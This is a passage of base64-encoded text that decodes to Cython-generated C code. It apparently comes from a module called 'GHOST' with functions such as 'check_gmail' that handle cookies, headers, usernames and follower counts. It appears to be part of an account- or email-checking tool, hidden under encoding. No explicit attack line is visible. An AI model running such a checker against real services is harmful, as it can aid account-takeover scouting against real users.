XhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2xlZXApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMTYsIF9fcHl4X0wzMV9lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICBfX3B5eF90XzggPSAxO1xuICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkge1xuICAgICAgICAgIF9fcHl4X3RfMTEgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpO1xuICAgICAgICAgIGFzc2VydChfX3B5eF90XzExKTtcbiAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIH1cbiAgICAgICAgI2VuZGlmXG4gICAgICAgIHtcbiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzJ9O1xuICAgICAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMi1fX3B5eF90XzgpIHwgKF9fcHl4X3RfOCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTMpKSBfX1BZWF9FUlIoMCwgMTE2LCBfX3B5eF9MMzFfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTMpO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7XG5cbiAgICAgICAgXG4gICAgICAgIF9fcHl4X3RfNCA9IF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9zZWxmO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTtcbiAgICAgICAgX19weXhfdF84ID0gMDtcbiAgICAgICAge1xuICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIE5VTEx9O1xuICAgICAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90bGwsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDEtX19weXhfdF84KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTMpKSBfX1BZWF9FUlIoMCwgMTE3LCBfX3B5eF9MMzFfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTMpO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7XG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgIHtcbiAgICAgICAge1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwO1xuICAgICAgICAgIGdvdG8gX19weXhfTDMyO1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X0wzMV9lcnJvcjo7XG4gICAgICAgIHtcbiAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgICAgICAgIF9fcHl4X3RfMTQgPSAwOyBfX3B5eF90XzE3ID0gMDsgX19weXhfdF8xNiA9IDA7IF9fcHl4X3RfMTUgPSAwOyBfX3B5eF90XzE5ID0gMDsgX19weXhfdF8yNCA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmX19weXhfdF8xNSwgJl9fcHl4X3RfMTksICZfX3B5eF90XzI0KTtcbiAgICAgICAgICBpZiAoIHVubGlrZWx5KF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xNCwgJl9fcHl4X3RfMTcsICZfX3B5eF90XzE2KSA8IDApKSBfX1B5eF9FcnJGZXRjaCgmX19weXhfdF8xNCwgJl9fcHl4X3RfMTcsICZfX3B5eF90XzE2KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNyk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTUpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xOSk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzI0KTtcbiAgICAgICAgICBfX3B5eF90XzIxID0gX19weXhfbGluZW5vOyBfX3B5eF90XzIyID0gX19weXhfY2xpbmVubzsgX19weXhfdF8yMyA9IF9fcHl4X2ZpbGVuYW1lO1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE5KTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzI0KTtcbiAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzE1LCBfX3B5eF90XzE5LCBfX3B5eF90XzI0KTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE3KTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKF9fcHl4X3RfMTQsIF9fcHl4X3RfMTcsIF9fcHl4X3RfMTYpO1xuICAgICAgICAgIF9fcHl4X3RfMTQgPSAwOyBfX3B5eF90XzE3ID0gMDsgX19weXhfdF8xNiA9IDA7IF9fcHl4X3RfMTUgPSAwOyBfX3B5eF90XzE5ID0gMDsgX19weXhfdF8yNCA9IDA7XG4gICAgICAgICAgX19weXhfbGluZW5vID0gX19weXhfdF8yMTsgX19weXhfY2xpbmVubyA9IF9fcHl4X3RfMjI7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfdF8yMztcbiAgICAgICAgICBnb3RvIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjtcbiAgICAgICAgfVxuICAgICAgICBfX3B5eF9MMzI6O1xuICAgICAgfVxuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBnb3RvIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgIH1cbiAgICBnb3RvIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjtcblxuICAgIFxuICAgIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MNF9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7XG4gICAgX19weXhfTDhfdHJ5X2VuZDo7XG4gIH1cblxuICBcblxuICBcbiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTtcbiAgZ290byBfX3B5eF9MMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QudGxsIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9uMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9uMik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9ob3N0KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlMyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9yZXMxKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X21hdGNoKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3Rvayk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9jb29raWVzKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlYWRlcnMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZGF0YSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9yZXNwb25zZSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl90bF9tYXRjaCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl90bCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9mKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2UpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X2diXzJ0dF81R0hPU1RfM3RsbF8yZ2VuZXJhdG9yKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF9nYl8ydHRfNUdIT1NUXzN0bGxfNWdlbmVyYXRvcjEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X2diXzJ0dF81R0hPU1RfM3RsbF84Z2VuZXJhdG9yMik7XG4gIF9fUHl4X0RFQ1JFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0dF81R0hPU1RfMTNjaGVja19nbWFpbChQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKTsgXG5zdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ydHRfNUdIT1NUXzEzY2hlY2tfZ21haWwgPSB7ImNoZWNrX2dtYWlsIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18ydHRfNUdIT1NUXzEzY2hlY2tfZ21haWwsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0dF81R0hPU1RfMTNjaGVja19nbWFpbChQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYgPSAwO1xuICBQeU9iamVjdCAqX19weXhfdl9lbWFpbCA9IDA7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzO1xuICAjZW5kaWZcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzO1xuICBQeU9iamVjdCogdmFsdWVzWzJdID0gezAsMH07XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiY2hlY2tfZ21haWwgKHdyYXBwZXIpIiwgMCk7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTtcbiAgI2Vsc2VcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDtcbiAgI2VuZGlmXG4gICNlbmRpZlxuICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTtcbiAge1xuICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlbGYsJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbWFpbCwwfTtcbiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDtcbiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDExOSwgX19weXhfTDNfZXJyb3IpXG4gICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkge1xuICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykge1xuICAgICAgICBjYXNlICAyOlxuICAgICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7XG4gICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDExOSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMTpcbiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAxMTksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDA6IGJyZWFrO1xuICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgICAgfVxuICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJncztcbiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJjaGVja19nbWFpbCIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMTE5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAyOyBpKyspIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJjaGVja19nbWFpbCIsIDEsIDIsIDIsIGkpOyBfX1BZWF9FUlIoMCwgMTE5LCBfX3B5eF9MM19lcnJvcikgfVxuICAgICAgfVxuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMikpIHtcbiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgfSBlbHNlIHtcbiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDExOSwgX19weXhfTDNfZXJyb3IpXG4gICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCAxMTksIF9fcHl4X0wzX2Vycm9yKVxuICAgIH1cbiAgICBfX3B5eF92X3NlbGYgPSB2YWx1ZXNbMF07XG4gICAgX19weXhfdl9lbWFpbCA9IHZhbHVlc1sxXTtcbiAgfVxuICBnb3RvIF9fcHl4X0w2X3NraXA7XG4gIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjtcbiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImNoZWNrX2dtYWlsIiwgMSwgMiwgMiwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgMTE5LCBfX3B5eF9MM19lcnJvcilcbiAgX19weXhfTDZfc2tpcDo7XG4gIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7XG4gIF9fcHl4X0wzX2Vycm9yOjtcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9BZGRUcmFjZWJhY2soInR0LkdIT1NULmNoZWNrX2dtYWlsIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gTlVMTDtcbiAgX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU6O1xuICBfX3B5eF9yID0gX19weXhfcGZfMnR0XzVHSE9TVF8xMmNoZWNrX2dtYWlsKF9fcHl4X3NlbGYsIF9fcHl4X3Zfc2VsZiwgX19weXhfdl9lbWFpbCk7XG5cbiAgXG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0dF81R0hPU1RfMTJjaGVja19nbWFpbChDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9lbWFpbCkge1xuICBQeU9iamVjdCAqX19weXhfdl9vcmlnaW5hbF9lbWFpbCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2YgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9vID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfdGwgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9ob3N0ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfY29va2llcyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9wYXJhbXMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9kYXRhID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfcmVzcG9uc2UgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl91c2VybmFtZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2ZvbGxvd2VyX2NvdW50ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3Zfb2sgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9nZyA9IE5VTEw7XG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDtcbiAgaW50IF9fcHl4X3RfNDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzkgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzExID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTIgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF8xMztcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xNSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE2ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTcgPSBOVUxMO1xuICBpbnQgX19weXhfdF8xODtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTkgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yMCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIxID0gTlVMTDtcbiAgUHlPYmplY3QgKigqX19weXhfdF8yMikoUHlPYmplY3QgKik7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIzWzVdO1xuICBpbnQgX19weXhfdF8yNDtcbiAgaW50IF9fcHl4X3RfMjU7XG4gIGNoYXIgY29uc3QgKl9fcHl4X3RfMjY7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImNoZWNrX2dtYWlsIiwgMCk7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF92X2VtYWlsKTtcblxuICBcbiAge1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xLCAmX19weXhfdF8yLCAmX19weXhfdF8zKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTtcbiAgICAge1xuXG4gICAgICBcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF92X2VtYWlsKTtcbiAgICAgIF9fcHl4X3Zfb3JpZ2luYWxfZW1haWwgPSBfX3B5eF92X2VtYWlsO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNCA9IChfX1B5eF9QeVNlcXVlbmNlX0NvbnRhaW5zVEYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fNywgX19weXhfdl9lbWFpbCwgUHlfRVEpKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzQgPCAwKSkpIF9fUFlYX0VSUigwLCAxMjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKF9fcHl4X3RfNCkge1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3ZfZW1haWwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMjMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgX19weXhfdF82ID0gUHlVbmljb2RlX1NwbGl0KCgoUHlPYmplY3QqKV9fcHl4X3RfNSksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzcsIC0xKTsgaWYgKHVubG